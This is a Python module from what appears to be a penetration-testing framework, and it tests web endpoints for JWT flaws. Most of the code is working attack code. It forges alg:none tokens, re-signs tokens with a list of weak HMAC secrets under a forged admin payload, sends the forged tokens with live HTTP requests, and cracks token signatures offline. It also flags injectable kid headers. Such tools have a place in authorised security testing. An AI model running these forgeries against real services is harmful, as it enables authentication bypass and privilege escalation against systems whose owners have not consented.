"""
modules/jwt_analyzer.py - JWT (JSON Web Token) Vulnerability Analyzer
Detects: alg:none, weak HS256 secrets, algorithm confusion (RS256→HS256),
kid injection, jku/x5u header injection, expired token acceptance.
"""

import re
import json
import base64
import hmac
import hashlib
import logging
from typing import Dict, List, Any, Optional
from core.http_engine import HTTPClient
from core.state_manager import StateManager

logger = logging.getLogger("recon.jwt_analyzer")


class JWTAnalyzer:
    """
    JWT vulnerability detection and exploitation.

    Attack vectors:
    1. Algorithm none - strip signature
    2. Weak HMAC secret brute-force
    3. RS256 → HS256 algorithm confusion
    4. kid (Key ID) SQL/path injection
    5. jku/x5u header pointing to attacker-controlled JWK
    6. Expired token still accepted
    7. Sensitive data in unencrypted payload
    """

    WEAK_SECRETS = [
        "secret", "password", "123456", "changeme", "default",
        "key", "jwt", "token", "admin", "test", "dev",
        "your-256-bit-secret", "your-secret-key", "supersecret",
        "", "null", "undefined", "jwt_secret", "app_secret",
        "flask-secret", "django-insecure", "laravel", "rails",
    ]

    def __init__(self, state: StateManager = None, http_client: HTTPClient = None):
        self.state = state
        self.http_client = http_client or HTTPClient()

    def detect(self, endpoints: List[Any], progress_cb=None) -> Dict[str, Any]:
        """Scan endpoints for JWT vulnerabilities."""
        logger.info(f"[JWT] Starting JWT analysis on {len(endpoints)} endpoints")

        results = {
            "vulnerabilities": [],
            "endpoints_tested": 0,
            "jwt_confirmed": 0,
        }

        # Collect JWT tokens from state (auth responses, cookies, headers)
        jwt_tokens = self._collect_tokens_from_state()

        for i, endpoint in enumerate(endpoints):
            if progress_cb:
                progress_cb(i, len(endpoints))

            if isinstance(endpoint, dict):
                url = endpoint.get("url") or endpoint.get("endpoint")
            else:
                url = str(endpoint)

            if not url:
                continue

            # Test endpoint for JWT exposure and acceptance
            endpoint_result = self._test_endpoint(url, jwt_tokens)
            if endpoint_result.get("vulnerable"):
                results["vulnerabilities"].append(endpoint_result)
                results["jwt_confirmed"] += 1

            results["endpoints_tested"] += 1

        # Analyze collected tokens offline
        for token in jwt_tokens:
            token_result = self._analyze_token(token)
            if token_result.get("vulnerable"):
                results["vulnerabilities"].append(token_result)
                results["jwt_confirmed"] += 1

        logger.info(f"[JWT] Found {results['jwt_confirmed']} JWT vulnerabilities")
        return results

    def _collect_tokens_from_state(self) -> List[str]:
        """Extract JWT tokens from state (cookies, auth headers, responses)."""
        tokens = []
        if not self.state:
            return tokens

        # Check credentials
        creds = self.state.get("credentials") or []
        for cred in creds:
            for val in cred.values() if isinstance(cred, dict) else []:
                if isinstance(val, str) and self._is_jwt(val):
                    tokens.append(val)

        # Check raw findings
        findings = self.state.get("findings") or []
        for f in findings:
            for val in (f.values() if isinstance(f, dict) else []):
                if isinstance(val, str) and self._is_jwt(val):
                    tokens.append(val)

        return list(set(tokens))

    def _is_jwt(self, s: str) -> bool:
        """Check if string looks like a JWT."""
        parts = s.split(".")
        if len(parts) != 3:
            return False
        try:
            # Try decoding header
            padding = 4 - len(parts[0]) % 4
            decoded = base64.urlsafe_b64decode(parts[0] + "=" * padding)
            header = json.loads(decoded)
            return "alg" in header
        except Exception:
            return False

    def _decode_token(self, token: str) -> Optional[Dict]:
        """Decode JWT without verification."""
        try:
            parts = token.split(".")
            header_b64, payload_b64 = parts[0], parts[1]
            header = json.loads(base64.urlsafe_b64decode(header_b64 + "=="))
            payload = json.loads(base64.urlsafe_b64decode(payload_b64 + "=="))
            return {"header": header, "payload": payload, "signature": parts[2]}
        except Exception:
            return None

    def _forge_none_alg(self, token: str) -> Optional[str]:
        """Forge token with alg:none."""
        decoded = self._decode_token(token)
        if not decoded:
            return None
        new_header = {**decoded["header"], "alg": "none"}
        h = base64.urlsafe_b64encode(json.dumps(new_header).encode()).rstrip(b"=").decode()
        p = token.split(".")[1]
        return f"{h}.{p}."

    def _forge_hs256_with_secret(self, token: str, secret: str) -> Optional[str]:
        """Re-sign token with weak HS256 secret."""
        decoded = self._decode_token(token)
        if not decoded:
            return None
        new_header = {**decoded["header"], "alg": "HS256"}
        # Forge admin payload
        new_payload = {**decoded["payload"], "role": "admin", "is_admin": True, "sub": "admin"}
        import time
        new_payload["exp"] = int(time.time()) + 86400

        h = base64.urlsafe_b64encode(json.dumps(new_header, separators=(",", ":")).encode()).rstrip(b"=").decode()
        p = base64.urlsafe_b64encode(json.dumps(new_payload, separators=(",", ":")).encode()).rstrip(b"=").decode()
        msg = f"{h}.{p}"
        sig = hmac.new(secret.encode(), msg.encode(), hashlib.sha256).digest()
        s = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
        return f"{msg}.{s}"

    def _test_endpoint(self, url: str, tokens: List[str]) -> Dict[str, Any]:
        """Test endpoint with forged JWT tokens."""
        result = {
            "url": url,
            "vulnerable": False,
            "confidence": 0.0,
            "attack": None,
            "evidence": [],
        }

        for token in tokens[:3]:  # Limit to 3 tokens per endpoint
            decoded = self._decode_token(token)
            if not decoded:
                continue

            # Attack 1: alg:none
            forged_none = self._forge_none_alg(token)
            if forged_none:
                vuln = self._test_forged_token(url, token, forged_none, "alg:none bypass")
                if vuln:
                    result.update({"vulnerable": True, "confidence": 0.9,
                                   "attack": "alg:none", "evidence": [vuln]})
                    return result

            # Attack 2: Weak secret brute-force
            for secret in self.WEAK_SECRETS[:10]:
                forged_hmac = self._forge_hs256_with_secret(token, secret)
                if forged_hmac:
                    vuln = self._test_forged_token(url, token, forged_hmac,
                                                   f"weak secret: '{secret}'")
                    if vuln:
                        result.update({"vulnerable": True, "confidence": 0.85,
                                       "attack": f"weak_secret:{secret}", "evidence": [vuln]})
                        return result

        return result

    def _test_forged_token(
        self, url: str, original: str, forged: str, attack_name: str
    ) -> Optional[Dict]:
        """Send forged token and compare response to original."""
        try:
            orig_resp = self.http_client.get(
                url, headers={"Authorization": f"Bearer {original}"}, timeout=10
            )
            forged_resp = self.http_client.get(
                url, headers={"Authorization": f"Bearer {forged}"}, timeout=10
            )

            # If forged token gets same or better access
            if forged_resp.status_code == orig_resp.status_code and forged_resp.status_code == 200:
                return {"attack": attack_name, "original_status": orig_resp.status_code,
                        "forged_status": forged_resp.status_code}
            if orig_resp.status_code in [401, 403] and forged_resp.status_code == 200:
                return {"attack": attack_name, "original_status": orig_resp.status_code,
                        "forged_status": forged_resp.status_code, "escalated": True}
        except Exception as e:
            logger.debug(f"[JWT] Error testing forged token on {url}: {e}")
        return None

    def _analyze_token(self, token: str) -> Dict[str, Any]:
        """Analyze a JWT token for offline vulnerabilities."""
        result = {
            "token_snippet": token[:40] + "...",
            "vulnerable": False,
            "issues": [],
            "confidence": 0.0,
        }

        decoded = self._decode_token(token)
        if not decoded:
            return result

        header = decoded["header"]
        payload = decoded["payload"]
        issues = []

        # Check alg
        alg = header.get("alg", "").lower()
        if alg == "none":
            issues.append({"issue": "alg:none - no signature", "severity": "CRITICAL"})
        elif alg in ["hs256", "hs384", "hs512"]:
            # Try weak secrets
            original_msg = ".".join(token.split(".")[:2])
            sig_b64 = token.split(".")[2]
            for secret in self.WEAK_SECRETS:
                alg_map = {"hs256": hashlib.sha256, "hs384": hashlib.sha384, "hs512": hashlib.sha512}
                h = alg_map.get(alg, hashlib.sha256)
                expected_sig = hmac.new(secret.encode(), original_msg.encode(), h).digest()
                expected_b64 = base64.urlsafe_b64encode(expected_sig).rstrip(b"=").decode()
                if expected_b64 == sig_b64:
                    issues.append({"issue": f"Weak HMAC secret: '{secret}'", "severity": "CRITICAL"})
                    break

        # Check for sensitive data in payload
        sensitive_keys = ["password", "passwd", "secret", "key", "credit", "ssn", "dob"]
        for k in payload:
            if any(s in k.lower() for s in sensitive_keys):
                issues.append({"issue": f"Sensitive data in payload: '{k}'", "severity": "HIGH"})

        # Check expiry
        import time
        exp = payload.get("exp", 0)
        if exp and exp < time.time():
            issues.append({"issue": "Expired token - test if server still accepts", "severity": "MEDIUM"})

        # kid injection risk
        kid = header.get("kid", "")
        if kid:
            if any(c in kid for c in ["'", '"', "--", ";", "/", ".."]):
                issues.append({"issue": f"Potentially injectable kid: {kid}", "severity": "HIGH"})

        if issues:
            result["vulnerable"] = True
            result["issues"] = issues
            result["confidence"] = 0.8

        return result


def detect_jwt(
    state: StateManager, endpoints: List[Any], progress_cb=None
) -> Dict[str, Any]:
    """Standalone function for JWT vulnerability detection."""
    detector = JWTAnalyzer(state=state)
    return detector.detect(endpoints, progress_cb)
